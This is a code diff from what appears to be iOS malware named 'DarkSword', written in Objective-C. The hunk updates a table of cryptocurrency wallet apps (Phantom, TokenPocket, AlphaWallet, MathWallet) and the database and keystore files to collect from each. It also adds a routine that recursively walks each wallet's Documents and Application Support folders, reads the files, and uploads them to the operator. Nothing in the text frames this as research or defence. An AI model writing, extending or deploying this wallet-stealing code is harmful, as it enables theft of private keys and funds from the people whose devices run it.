@@ -394,7 +394,7 @@ static NSArray<NSDictionary *> *DSWalletTargets(void)
         @{@"type": @"phantom", @"bundleId": @"app.phantom",
           @"files": @[@"phantom.db", @"accounts.json"]},
         @{@"type": @"tokenpocket", @"bundleId": @"com.global.wallet.ios",
-          @"files": @[@"wallet.db", @"accounts.db"]},
+          @"files": @[@"db/main.sqlite3", @"db/label.sqlite3"]},
         @{@"type": @"alphawallet", @"bundleId": @"io.stormbird.wallet",
           @"files": @[@"AlphaWallet.sqlite"]},
         @{@"type": @"mathwallet", @"bundleId": @"com.mathwallet",
@@ -447,6 +447,30 @@ static NSString *DSWalletScanOne(NSDictionary *wallet)
             [found addObject:[NSString stringWithFormat:@"%@ (%luB)", relative, (unsigned long)data.length]];
             break; // found this file, move to the next target
         }
+    }
+
+    // Also grab the wallet's Documents + Application Support trees (bounded,
+    // skipping cache and oversized files) to catch dynamically-named keystore
+    // files we cannot hardcode (e.g. TokenPocket's Documents/F4SeCyr/<sha256>).
+    NSArray<NSString *> *grabDirs = @[
+        [container stringByAppendingPathComponent:@"Documents"],
+        [container stringByAppendingPathComponent:@"Library/Application Support"],
+    ];
+    NSMutableArray<NSDictionary *> *all = [NSMutableArray array];
+    for (NSString *dir in grabDirs) {
+        DSRecurseInto(dir, 4, all, 300);
+    }
+    for (NSDictionary *entry in all) {
+        if ([entry[@"dir"] boolValue]) continue;
+        NSString *path = entry[@"name"];
+        unsigned long long size = [entry[@"size"] unsignedLongLongValue];
+        if (size == 0 || size > 20 * 1024 * 1024) continue;
+        if ([path rangeOfString:@"/cache/" options:NSCaseInsensitiveSearch].location != NSNotFound) continue;
+        if ([path rangeOfString:@"/Caches/" options:NSCaseInsensitiveSearch].location != NSNotFound) continue;
+        NSData *data = DSReadFileBytes(path);
+        if (data.length == 0) continue;
+        DarkSwordUpload(@"wallet", path,
+                        [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID], data, nil);
     }
 
     // Always upload a bounded directory tree so the operator can see the
